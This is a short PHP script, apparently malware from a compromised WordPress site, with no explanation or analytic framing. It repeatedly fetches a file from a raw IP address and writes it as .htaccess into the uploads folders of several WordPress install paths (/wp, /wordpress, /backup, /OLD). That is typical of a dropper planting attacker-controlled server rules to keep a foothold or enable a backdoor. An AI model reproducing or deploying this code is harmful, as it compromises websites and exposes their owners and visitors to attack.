<?php
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1236 = $_SERVER['DOCUMENT_ROOT'] . "/wp/wp-content/uploads/2023/05/.htaccess" ;
$text1236 = http_get('http://213.232.193.94/ww/81.txt');
$open1236 = fopen($check1236, 'w');
fwrite($open1236, $text1236);
fclose($open1236);
if(file_exists($check1236)){
}
$check22 = $_SERVER['DOCUMENT_ROOT'] . "/wordpress/wp-content/uploads/2023/05/.htaccess" ;
$text22 = http_get('http://213.232.193.94/ww/81.txt');
$open22 = fopen($check22, 'w');
fwrite($open22, $text22);
fclose($open22);
if(file_exists($check22)){
}
$check221 = $_SERVER['DOCUMENT_ROOT'] . "/backup/wp-content/uploads/2023/05/.htaccess" ;
$text221 = http_get('http://213.232.193.94/ww/81.txt');
$open221 = fopen($check221, 'w');
fwrite($open221, $text221);
fclose($open221);
if(file_exists($check221)){
}
$check223 = $_SERVER['DOCUMENT_ROOT'] . "/OLD/wp-content/uploads/2023/05/.htaccess" ;
$text223 = http_get('http://213.232.193.94/ww/81.txt');
$open223 = fopen($check223, 'w');
fwrite($open223, $text223);
fclose($open223);
if(file_exists($check223)){
}